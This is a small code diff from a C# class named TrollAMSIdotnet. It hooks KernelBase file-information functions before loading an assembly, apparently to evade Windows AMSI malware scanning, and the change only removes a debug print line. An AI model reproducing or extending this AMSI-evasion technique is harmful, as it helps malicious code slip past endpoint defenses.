@@ -105,7 +105,6 @@ public static class TrollAMSIdotnet
         hook3.Install(hook3.GetProcAddress("KernelBase.dll", "GetFileAttributesExW"), Marshal.GetFunctionPointerForDelegate(C));
         hook4.Install(hook4.GetProcAddress("KernelBase.dll", "GetFileInformationByHandle"), Marshal.GetFunctionPointerForDelegate(D));
      
-        Console.WriteLine(loadedAssemblyName.Substring(0, loadedAssemblyName.Length - 4));
         Assembly a = Assembly.Load(loadedAssemblyName.Substring(0, loadedAssemblyName.Length - 4));
 
         attribDataSet = false;
